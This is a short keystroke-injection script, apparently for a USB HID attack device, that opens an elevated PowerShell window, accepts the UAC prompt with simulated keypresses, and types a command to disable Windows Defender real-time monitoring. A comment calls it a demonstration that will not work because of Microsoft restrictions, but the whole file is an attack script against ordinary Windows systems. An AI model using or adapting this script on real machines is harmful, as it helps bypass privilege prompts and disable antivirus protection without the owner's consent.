// WIN-A02--DisableDefender-PS.js
// Version: 2023-06-08--002


// Set keyboard layout to German (DE)
layout('DE');
typingSpeed(0,0);


// Get command prompt with administrative privileges
press("GUI r");
delay(1000);
type("powershell");
delay(700);
press("CTRL SHIFT RETURN");
delay(2500);
press("SHIFT TAB");
press("ENTER");
delay(1000);


// Try to disable Defender via Powershell
// Will not work due to Microsoft restrictions - just a demonstration
typingSpeed(50,100);
type("Set-MpPreference -DisableRealtimeMonitoring $true");
press("RETURN");

type("\n\n\n");
type("    # Window will be closed automatically ...\n\n");
type("exit");
press("ENTER");
